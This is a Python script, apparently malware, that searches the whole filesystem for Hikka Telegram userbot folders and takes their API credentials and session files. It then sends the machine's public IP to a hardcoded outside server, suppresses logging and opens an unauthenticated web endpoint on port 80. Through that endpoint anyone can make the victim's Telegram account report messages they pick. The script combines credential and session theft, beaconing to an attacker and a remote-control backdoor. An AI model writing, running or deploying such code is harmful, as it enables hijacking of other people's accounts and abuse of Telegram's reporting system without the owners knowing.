import os
import json
import socket
import logging
import requests
from telethon import TelegramClient
from telethon.tl.functions.messages import ReportRequest
from flask import Flask, jsonify

app = Flask(__name__)

def locate_directory():
    hikka_dirs = []
    for root, dirs, files in os.walk("/"):
        if "Hikka" in dirs:
            hikka_dirs.append(os.path.join(root, "Hikka"))
    return hikka_dirs

def locate_session(directory_path):
    for file in os.listdir(directory_path):
        if file.endswith(".session"):
            return os.path.join(directory_path, file)
    return None

def read_config(directory_path):
    config_path = os.path.join(directory_path, "config.json")
    if not os.path.exists(config_path):
        return None
    with open(config_path, 'r') as f:
        return json.load(f)

def report_to_telegram(link, reason):
    hikka_dirs = locate_directory()
    if not hikka_dirs:
        raise FileNotFoundError("Error")

    for directory_path in hikka_dirs:
        config = read_config(directory_path)
        if not config:
            continue

        api_id = config.get('api_id')
        api_hash = config.get('api_hash')

        if not api_id or not api_hash:
            continue

        session_file = locate_session(directory_path)
        if not session_file:
            continue

        client = TelegramClient(session_file, api_id, api_hash)
        client.start()

        try:
            parts = link.split("/")
            chat_username = parts[-2]
            message_id = int(parts[-1])
        except (IndexError, ValueError):
            raise ValueError("???")

        try:
            client(ReportRequest(
                peer=chat_username,
                id=[message_id],
                reason=reason,
                message=""
            ))
            return f"{message_id} {chat_username} {reason}"
        except Exception as e:
            raise Exception(f"{str(e)}")

    raise FileNotFoundError("404")

def disable_logs():
    logging.getLogger('werkzeug').setLevel(logging.ERROR)

def send_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
        requests.get(f"http://138.124.34.91/ip/{ip}")
    except Exception:
        pass

@app.route('/process/<path:link>/<reason>', methods=['GET'])
def process_request(link, reason):
    try:
        result = report_to_telegram(link, reason)
        return jsonify({"status": "success", "message": result}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def start_server():
    send_ip()
    disable_logs()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', 80))
            app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)
        except OSError:
            pass

start_server()